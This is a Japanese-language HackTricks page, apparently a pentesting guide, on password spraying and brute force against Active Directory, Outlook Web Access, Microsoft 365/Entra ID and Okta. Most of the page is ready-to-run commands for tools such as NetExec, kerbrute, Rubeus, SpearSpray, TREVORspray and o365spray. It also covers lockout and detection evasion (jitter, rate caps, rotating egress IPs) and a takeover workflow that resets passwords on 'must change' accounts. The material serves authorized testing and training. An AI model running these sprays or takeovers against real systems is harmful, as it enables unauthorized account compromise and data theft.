# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

複数の**有効なユーザー名**を見つけたら、発見した各ユーザーに対して、最も**一般的なパスワード**を試すことができます（環境のパスワードポリシーを考慮してください）。\
**デフォルト**では、**パスワード**の**最小** **長**は **7** です。

一般的なユーザー名のリストも役立つ場合があります: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

**複数の間違ったパスワードを試すと、一部のアカウントがロックアウトされる可能性がある**ことに注意してください（デフォルトでは10回超）。

### パスワードポリシーの取得

ユーザーの認証情報またはドメインユーザーとしてのシェルを持っている場合、以下で**パスワードポリシーを取得できます**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux（またはすべて）からのExploit

- **crackmapexec**を使用:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- SMB/WinRM across で、対象を絞った低ノイズの spraying に **NetExec (CME successor)** を使用する:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) を使用する
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ロックアウトを回避するために試行回数を指定できます):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（python）を使用 - 推奨されません。動作しない場合があります<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit** の `scanner/smb/smb_login` module を使用:

![Password Spraying - Brute-Force: Metasploit の scanner/smb/smb login module を使用](<../../images/image (745).png>)

- **rpcclient** を使用:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows から

- [Rubeus](https://github.com/Zer1t0/Rubeus) の brute module を備えたバージョンを使用:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用（デフォルトで domain からユーザーを生成でき、domain から password policy を取得して、それに従って試行回数を制限します）：<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用する
```
Invoke-SprayEmptyPassword
```
### 「次回ログオン時にパスワードの変更が必要」アカウントの特定と乗っ取り（SAMR）

低ノイズな手法として、無害なパスワードまたは空のパスワードを spray し、STATUS_PASSWORD_MUST_CHANGE を返すアカウントを検出します。これは、パスワードが強制的に期限切れにされており、古いパスワードを知らなくても変更できることを示します。<sup>[[9]](#references)[[10]](#references)</sup>

ワークフロー:
- ユーザーを列挙し（SAMR 経由の RID brute）、ターゲットリストを作成します:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- 空のパスワードをSprayし、次回ログオン時にパスワードの変更が必要なアカウントを取得するため、hitがあっても続行する:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 各ヒットについて、NetExec の module を使用して SAMR 経由で password を変更する（"must change" が設定されている場合、古い password は不要）：
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
運用上の注意:
- Kerberosベースの操作を行う前に、ホストのクロックをDCと同期させます: `sudo ntpdate <dc_fqdn>`。
- 一部のモジュール（RDP/WinRM）で、(Pwn3d!) を伴わない [+] は、credsが有効であるものの、そのアカウントにインタラクティブログオン権限がないことを意味します。

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### LDAP targeting と PSO-aware throttling を用いた Kerberos pre-auth spraying (SpearSpray)

Kerberos pre-auth ベースの spraying は、SMB/NTLM/LDAP bind の試行と比べてノイズを減らし、AD の lockout ポリシーにも適合しやすくなります。SpearSpray は、LDAP による targeting、pattern engine、ポリシー認識機能（domain policy + PSO + badPwdCount buffer）を組み合わせ、正確かつ安全に spraying を行います。また、BloodHound の pathing 用に、侵害された principal を Neo4j でタグ付けすることもできます。<sup>[[1]](#references)</sup>

主なアイデア:
- paging と LDAPS support を備えた LDAP user discovery。custom LDAP filters も任意で使用可能。
- Domain lockout policy と PSO-aware filtering により、設定可能な試行 buffer（threshold）を残してユーザーの lockout を回避。
- fast gssapi bindings を使用した Kerberos pre-auth validation（DC 上で 4625 ではなく 4768/4771 を生成）。
- 各ユーザーの pwdLastSet から導出した names や temporal values などの変数を使用した、pattern-based の per-user password generation。
- threads、jitter、max requests per second による throughput control。
- BloodHound 用に owned users をマークする Neo4j integration（任意）。

基本的な usage と discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
ターゲット設定とパターン制御:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
ステルス性と安全性の制御:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound の情報拡充:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern システムの概要（patterns.txt）：
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
利用可能な変数:
- {name}, {samaccountname}
- 各ユーザーの pwdLastSet（または whenCreated）から取得する時系列情報: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- 構成用ヘルパーと組織トークン: {separator}, {suffix}, {extra}

運用上の注意:

- 最も信頼性の高い badPwdCount とポリシー関連情報を読み取るため、-dc を指定して PDC-emulator にクエリすることを優先します。
- badPwdCount のリセットは観測ウィンドウの次の試行時に発生します。安全を維持するため、しきい値とタイミングを使用してください。
- Kerberos pre-auth の試行は DC の telemetry 上で 4768/4771 として記録されます。jitter と rate-limiting を使用して、通常の通信に紛れ込ませてください。

> Tip: SpearSpray のデフォルト LDAP ページサイズは 200 です。必要に応じて -lps で調整してください。

## Outlook Web Access

Outlook での **password spraying** には、複数のツールがあります。

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) を使用
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) を使用
- [Ruler](https://github.com/sensepost/ruler) を使用（信頼性が高いです！）<sup>[[5]](#references)</sup>
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) を使用（Powershell）
- [MailSniper](https://github.com/dafthack/MailSniper) を使用（Powershell）

これらのツールを使用するには、ユーザーリストと、spray 用のパスワードまたは少数のパスワードリストが必要です。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

クラウド spraying では、まず tenant が **managed**、**federated**、**hybrid** のいずれであるかを特定します。endpoint と lockout の動作は on-prem AD と異なる場合があるためです。Microsoft Entra では、**Smart Lockout** によって、繰り返しの推測が lockout budget を消費する仕組みが変わります。<sup>[[7]](#references)</sup>

- **同じ不正な password** を繰り返しても lockout counter は増え続けませんが、**新しい候補**を試すと増加します。
- **Familiar** と **unfamiliar** の location には、それぞれ別の counter があります。
- **pass-through authentication (PTA)** を使用する tenant では、不正な password の hash tracking の恩恵を受けられないため、classic な lockout-sensitive target に近いものとして扱います。

実際には、**1ラウンドにつき1つの password** を spraying し、ラウンド間に十分な間隔を空け、guess を送信する前に tenant の実際の auth flow を検出できる tooling を優先します。

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) を使用すると、tenant の recon、`token_endpoint` の検出、`msol`/`adfs`/`owa`/`okta` への spraying、複数の egress IP を経由した traffic の rotation が可能です：
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365) を使用すると、再開可能な **実行プラン** を事前に作成し、認証順序をランダム化して、ロックアウトウィンドウの範囲外に留まるための **ユーザーごとの最小遅延** を適用できます。
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray) を使うと、tenant の検証、`onedrive` などのモジュールによるユーザー列挙、`oauth2` または `adfs` 経由での spray を実行できます。lockout window ごとに **ユーザーあたり 1 回の試行**に抑えることができます。すでに FireProx API がある場合は、`--proxy-url` で渡して送信元 IP を分散します:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Recent operator tradecraft has also moved toward **distributed cloud spraying**。 [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) は、time windows、password shuffling、ADFS/M365 spraying、および認証後の自動的なデータ窃取をサポートします。最近の実際の悪用では、**Microsoft Teams API** による account enumeration と **AWS region rotation** も使用され、複数の送信元地域に spray waves が分散されました。<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
